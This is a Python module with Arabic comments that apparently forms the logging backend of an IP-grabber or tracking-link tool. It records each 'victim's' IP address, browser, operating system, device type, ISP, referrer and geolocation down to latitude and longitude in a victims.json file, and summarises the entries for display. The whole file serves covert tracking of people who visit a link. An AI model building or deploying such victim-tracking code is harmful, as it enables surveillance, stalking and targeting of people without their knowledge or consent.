import json
import os
import re
from datetime import datetime

VICTIMS_FILE = 'victims.json'

def parse_user_agent(user_agent):
    """تحليل User-Agent لاستخراج معلومات المتصفح والجهاز"""
    if not user_agent or user_agent == 'Unknown':
        return {
            'browser': 'Unknown',
            'os': 'Unknown',
            'device_type': 'Unknown'
        }
    
    user_agent_lower = user_agent.lower()
    
    # تحديد نوع الجهاز
    device_type = 'Desktop'
    if any(x in user_agent_lower for x in ['mobile', 'android', 'iphone', 'ipad', 'windows phone']):
        device_type = 'Mobile'
    elif any(x in user_agent_lower for x in ['tablet', 'ipad']):
        device_type = 'Tablet'
    
    # تحديد المتصفح
    browser = 'Unknown'
    if 'chrome' in user_agent_lower and 'edg' not in user_agent_lower:
        browser = 'Chrome'
        match = re.search(r'Chrome/([0-9.]+)', user_agent)
        if match:
            browser += f" {match.group(1)}"
    elif 'safari' in user_agent_lower and 'chrome' not in user_agent_lower:
        browser = 'Safari'
        match = re.search(r'Version/([0-9.]+)', user_agent)
        if match:
            browser += f" {match.group(1)}"
    elif 'firefox' in user_agent_lower:
        browser = 'Firefox'
        match = re.search(r'Firefox/([0-9.]+)', user_agent)
        if match:
            browser += f" {match.group(1)}"
    elif 'edg' in user_agent_lower:
        browser = 'Edge'
        match = re.search(r'Edg/([0-9.]+)', user_agent)
        if match:
            browser += f" {match.group(1)}"
    elif 'opera' in user_agent_lower or 'opr' in user_agent_lower:
        browser = 'Opera'
    
    # تحديد نظام التشغيل
    os_name = 'Unknown'
    if 'windows' in user_agent_lower:
        os_name = 'Windows'
        if 'windows nt 10.0' in user_agent_lower:
            os_name = 'Windows 10/11'
        elif 'windows nt 6.3' in user_agent_lower:
            os_name = 'Windows 8.1'
        elif 'windows nt 6.1' in user_agent_lower:
            os_name = 'Windows 7'
    elif 'macintosh' in user_agent_lower or 'mac os x' in user_agent_lower:
        os_name = 'macOS'
        match = re.search(r'Mac OS X ([0-9_]+)', user_agent)
        if match:
            version = match.group(1).replace('_', '.')
            os_name += f" {version}"
    elif 'android' in user_agent_lower:
        os_name = 'Android'
        match = re.search(r'Android ([0-9.]+)', user_agent)
        if match:
            os_name += f" {match.group(1)}"
    elif 'iphone' in user_agent_lower or 'ipad' in user_agent_lower or 'ipod' in user_agent_lower:
        os_name = 'iOS'
        match = re.search(r'OS ([0-9_]+)', user_agent)
        if match:
            version = match.group(1).replace('_', '.')
            os_name += f" {version}"
    elif 'linux' in user_agent_lower:
        os_name = 'Linux'
    
    return {
        'browser': browser,
        'os': os_name,
        'device_type': device_type
    }

def get_isp_info(ip_address, geo_data):
    """استخراج معلومات مزود الخدمة من بيانات الموقع"""
    if not geo_data:
        return 'Unknown'
    
    isp = geo_data.get('isp', 'Unknown')
    org = geo_data.get('org', 'Unknown')
    
    if isp and isp != 'Unknown':
        return isp
    elif org and org != 'Unknown':
        return org
    
    return 'Unknown'

def load_victims():
    """تحميل قائمة الضحايا من الملف"""
    if not os.path.exists(VICTIMS_FILE):
        return []
    with open(VICTIMS_FILE, 'r', encoding='utf-8') as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return []

def save_victims(victims):
    """حفظ قائمة الضحايا في الملف"""
    with open(VICTIMS_FILE, 'w', encoding='utf-8') as f:
        json.dump(victims, f, indent=4, ensure_ascii=False)

def log_victim_data(ip_address, user_agent, referrer, geo_data=None):
    """تسجيل بيانات الضحية مع تحليل شامل"""
    victims = load_victims()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # تحليل User-Agent
    ua_info = parse_user_agent(user_agent)
    
    # استخراج معلومات مزود الخدمة
    isp = get_isp_info(ip_address, geo_data)
    
    # استخراج معلومات الموقع
    country = 'Unknown'
    city = 'Unknown'
    latitude = 'Unknown'
    longitude = 'Unknown'
    
    if geo_data:
        country = geo_data.get('country', 'Unknown')
        city = geo_data.get('city', 'Unknown')
        latitude = geo_data.get('lat', 'Unknown')
        longitude = geo_data.get('lon', 'Unknown')
    
    victim_entry = {
        'timestamp': timestamp,
        'ip_address': ip_address,
        'browser': ua_info['browser'],
        'os': ua_info['os'],
        'device_type': ua_info['device_type'],
        'country': country,
        'city': city,
        'latitude': latitude,
        'longitude': longitude,
        'isp': isp,
        'referrer': referrer,
        'user_agent': user_agent,
        'full_geo_data': geo_data
    }
    
    victims.append(victim_entry)
    save_victims(victims)

def get_victims_data():
    """الحصول على قائمة الضحايا"""
    return load_victims()

def get_victims_summary():
    """الحصول على ملخص بيانات الضحايا للعرض في الجدول"""
    victims = load_victims()
    summary = []
    
    for victim in victims:
        summary.append({
            'timestamp': victim.get('timestamp', 'Unknown'),
            'ip_address': victim.get('ip_address', 'Unknown'),
            'browser': victim.get('browser', 'Unknown'),
            'os': victim.get('os', 'Unknown'),
            'device_type': victim.get('device_type', 'Unknown'),
            'country': victim.get('country', 'Unknown'),
            'city': victim.get('city', 'Unknown'),
            'isp': victim.get('isp', 'Unknown'),
            'referrer': victim.get('referrer', 'Unknown')
        })
    
    return summary
